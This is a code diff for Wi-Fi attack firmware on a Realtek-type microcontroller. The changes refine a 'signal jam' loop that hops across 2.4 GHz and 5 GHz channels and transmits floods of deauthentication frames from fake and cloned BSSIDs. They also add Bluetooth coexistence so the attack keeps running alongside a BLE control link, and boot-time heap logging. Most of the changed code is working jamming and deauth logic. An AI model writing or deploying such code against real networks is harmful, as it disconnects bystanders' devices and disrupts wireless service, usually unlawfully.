@@ -71,9 +71,9 @@ void setup() {
   Serial.begin(115200);
 
   uint32_t bootReason = BOOT_Reason();
-  char bootMsg[160];
+  char bootMsg[192];
   snprintf(bootMsg, sizeof(bootMsg),
-           "[BOOT] ResetReason=0x%08lX (WDG=%d KM4WDG=%d SYS=%d KM4SYS=%d BOD=%d DSLP=%d) FreeHeap=%luB",
+           "[BOOT] ResetReason=0x%08lX (WDG=%d KM4WDG=%d SYS=%d KM4SYS=%d BOD=%d DSLP=%d) FreeHeap=%luB MinEver=%luB",
            (unsigned long)bootReason,
            (bootReason & BIT_BOOT_WDG_RESET_HAPPEN) ? 1 : 0,
            (bootReason & BIT_BOOT_KM4WDG_RESET_HAPPEN) ? 1 : 0,
@@ -81,7 +81,8 @@ void setup() {
            (bootReason & BIT_BOOT_KM4SYS_RESET_HAPPEN) ? 1 : 0,
            (bootReason & BIT_BOOT_BOD_RESET_HAPPEN) ? 1 : 0,
            (bootReason & BIT_BOOT_DSLP_RESET_HAPPEN) ? 1 : 0,
-           (unsigned long)xPortGetFreeHeapSize());
+           (unsigned long)xPortGetFreeHeapSize(),
+           (unsigned long)xPortGetMinimumEverFreeHeapSize());
   Serial.println(bootMsg);
 
   wdt_enable(8000);
@@ -383,25 +384,23 @@ void loop() {
   }
 
   //===============================
-  // SIGNAL JAM (rapid channel cycling + deauth)
+  // SIGNAL JAM (rapid channel cycling + deauth, 2:1 interleaved 2.4G/5G for BLE coex)
   //===============================
   if (signal_jam_enabled && !emergencyStopRequested && (millis() - last_signal_jam >= signal_jam_hop_delay)) {
     last_signal_jam = millis();
     feedWatchdog();
-    // 合并轮询 2.4G + 5G 全信道，仅在切频成功时更新 currentChannel，并在 SoftAP 开启时及时回切 CH 1
-    static const int num2G = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
-    static const int num5G = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);
-    int totalChs = num2G + num5G;
+    // 采用 2:1 双频交错信道表（5GHz 连续驻留不超过 2 跳=200ms），并在 SoftAP 开启时及时回切 CH 1
+    static const int totalChs = (int)(sizeof(INTERLEAVED_DUAL_BAND_CHANNELS) / sizeof(INTERLEAVED_DUAL_BAND_CHANNELS[0]));
     if (signal_jam_ch_index < 0 || signal_jam_ch_index >= totalChs) {
       signal_jam_ch_index = 0;
     }
-    int targetCh = (signal_jam_ch_index < num2G)
-      ? CHANNELS_2GHZ[signal_jam_ch_index]
-      : CHANNELS_5GHZ[signal_jam_ch_index - num2G];
+    int targetCh = INTERLEAVED_DUAL_BAND_CHANNELS[signal_jam_ch_index];
     signal_jam_ch_index = (signal_jam_ch_index + 1) % totalChs;
 
+    int prevCh = getCurrentChannelSafe();
     if (wifi_set_channel(targetCh) == RTW_SUCCESS) {
       setCurrentChannelSafe(targetCh);
+      refreshBleCoexOnBandSwitch(prevCh, targetCh);
       for (int j = 0; j < 3; j++) {
         if (shouldAbortCycle()) break;
         uint8_t fakeBSSID[6];
@@ -412,6 +411,7 @@ void loop() {
       if ((apEnabled || softApActive) && targetCh != WIFI_CHANNEL) {
         if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
           setCurrentChannelSafe(WIFI_CHANNEL);
+          refreshBleCoexOnBandSwitch(targetCh, WIFI_CHANNEL);
         }
       }
     } else {
@@ -458,18 +458,28 @@ void loop() {
     bool chReady = (targetCh == prevCh);
     if (!chReady && wifi_set_channel(targetCh) == RTW_SUCCESS) {
       setCurrentChannelSafe(targetCh);
+      refreshBleCoexOnBandSwitch(prevCh, targetCh);
       switched = true;
       chReady = true;
     }
     if (chReady) {
       for (unsigned long j = 0; j < num_send_frames; j++) {
         if (shouldAbortCycle()) break;
+        if (targetCh >= 36 && j > 0 && (j % 32UL == 0UL) && isBleConnectedSafe()) {
+          serviceBleBreathingWindow(65UL, true);
+          if (shouldAbortCycle()) break;
+          if (wifi_set_channel(targetCh) == RTW_SUCCESS) {
+            setCurrentChannelSafe(targetCh);
+            refreshBleCoexOnBandSwitch(WIFI_CHANNEL, targetCh);
+          }
+        }
         wifi_tx_deauth_frame(clonedSrc, dst_mac, deauth_reasons[j % num_deauth_reasons]);
         delay(1);
       }
     }
     if (switched && wifi_set_channel(prevCh) == RTW_SUCCESS) {
       setCurrentChannelSafe(prevCh);
+      refreshBleCoexOnBandSwitch(targetCh, prevCh);
     }
     bool keepPromisc = false;
     rtw_enter_critical(NULL, NULL);
@@ -477,6 +487,7 @@ void loop() {
     rtw_exit_critical(NULL, NULL);
     if (keepPromisc) {
       wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);
+      enforceBleCoexPta(true);
     }
   }
 
@@ -488,6 +499,9 @@ void loop() {
   if (sniffingLoop) {
     hopChannel();
   }
+
+  // Periodic 2.4GHz BLE anchor keepalive whenever locked onto 5GHz (CH 36-165)
+  maintainBle5GHzKeepalive();
 
   // Drain sniff logs safely in main loop:
   // - UART capped at <=25 lines/s (>=40ms interval) to prevent 115200 TX FIFO stalls under bursts.
@@ -527,7 +541,7 @@ void loop() {
                            strncmp(logItem, "[MGMT] Disassoc", 15) == 0 ||
                            strstr(logItem, "Pwnagotchi") != nullptr);
         if (isPriority) {
-          if (lastBlePriorityLogMs == 0 || (nowLoopMs - lastBlePriorityLogMs >= 15)) {
+          if (lastBlePriorityLogMs == 0 || (nowLoopMs - lastBlePriorityLogMs >= 75)) {
             lastBlePriorityLogMs = nowLoopMs;
             if (!bleSendSniffLog((const char *)logItem, true)) {
               rtw_enter_critical(NULL, NULL);
